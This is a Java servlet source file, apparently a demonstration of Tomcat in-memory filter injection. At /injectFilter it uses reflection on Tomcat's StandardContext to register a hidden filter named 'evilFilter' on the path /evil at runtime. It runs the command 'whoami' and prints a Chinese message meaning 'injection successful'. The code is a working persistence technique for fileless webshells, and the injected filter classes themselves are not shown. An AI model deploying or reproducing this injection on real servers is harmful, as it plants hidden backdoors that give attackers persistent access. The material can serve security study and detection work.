package com;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;

@WebServlet("/injectFilter")
public class InjectFilter extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        ServletContext sc = req.getServletContext();
        String name = "evilFilter";
        try {
            ApplicationContext applicationContext;
            Field StandardContext0 = sc.getClass().getDeclaredField("context");
            StandardContext0.setAccessible(true);
            applicationContext = (ApplicationContext) StandardContext0.get(sc);

            StandardContext sContext;
            Field StandardContext1 = applicationContext.getClass().getDeclaredField("context");
            StandardContext1.setAccessible(true);
            sContext = (StandardContext) StandardContext1.get(applicationContext);

            java.lang.reflect.Field filerConfig = sContext.getClass().getDeclaredField("filterConfigs");
            filerConfig.setAccessible(true);
            Map filterConfigs = (Map) filerConfig.get(sContext);

            Filter injectFilter;

            if (filterConfigs.get(name) != null) {
                name = "evilFilter2";
                injectFilter = new injectFilterDemo2();
            } else {
                injectFilter = new injectFilterDemo();
            }

            java.lang.Runtime.getRuntime().exec("whoami");
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(injectFilter);
            filterDef.setFilterName(name);
            filterDef.setFilterClass(injectFilter.getClass().getName());
            sContext.addFilterDef(filterDef);

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/evil");
            filterMap.setFilterName(name);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            sContext.addFilterMap(filterMap);

            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class ,FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig afc = (ApplicationFilterConfig) constructor.newInstance(sContext ,filterDef);
            filterConfigs.put(name,afc);

            System.out.println("注入成功");
            System.out.println(filterConfigs);


        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        } catch (InvocationTargetException e) {
            throw new RuntimeException(e);
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        } catch (InstantiationException e) {
            throw new RuntimeException(e);
        }
    }
}
